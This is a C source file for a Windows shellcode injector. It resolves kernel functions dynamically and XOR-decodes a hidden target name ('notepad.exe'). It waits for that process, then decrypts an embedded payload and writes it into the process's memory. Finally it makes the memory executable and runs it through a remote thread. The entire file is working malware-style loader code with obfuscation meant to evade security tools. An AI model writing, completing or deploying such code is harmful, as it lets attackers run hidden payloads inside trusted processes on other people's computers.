#include <Windows.h>

#include "../vcmigrate/vcmigrate.bin.inc"

#define UTILS_IMPLEMENTATION
#include "../utils.h"

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
// int main()
{
    HMODULE hKernel = MyGetKernelModuleHandle();

    if (hKernel == NULL)
    {
        goto shutdown;
    }

    PopulateKernelFunctionPtrsByName(hKernel);

    char cNotepad[] = {0x5e, 0x5f, 0x44, 0x55, 0x40, 0x51, 0x54, 0x1e, 0x55, 0x48, 0x55, 0x0};
    MyXor(cNotepad, 11, key, 5);

    DWORD dwProcID = -1;
    while (1)
    {
        dwProcID = FindTargetProcessID(cNotepad);

        if (dwProcID != -1)
            break;

        pSleep(5000);
    }

    HANDLE hProc = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcID);

    if (hProc == NULL)
    {
        goto shutdown;
    }

    LPVOID lpvExecMem = pVirtualAllocEx(hProc, NULL, vcmigrate_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (lpvExecMem == NULL)
    {
        goto shutdown;
    }
    MyXor(vcmigrate_data, vcmigrate_data_len, key, 5);

    if (!pWriteProcessMemory(hProc, lpvExecMem, vcmigrate_data, vcmigrate_data_len, NULL))
    {
        goto shutdown;
    }

    DWORD dwOldProtect = 0;

    if (!pVirtualProtectEx(hProc, lpvExecMem, vcmigrate_data_len, PAGE_EXECUTE_READ, &dwOldProtect))
    {
        goto shutdown;
    }

    HANDLE hThread = pCreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)lpvExecMem, NULL, 0, NULL);

    if (hThread != NULL)
    {
        pWaitForSingleObject(hThread, INFINITE);
        pCloseHandle(hThread);
    }

shutdown:
    if (hProc != NULL)
    {
        pCloseHandle(hProc);
    }

    return 0;
}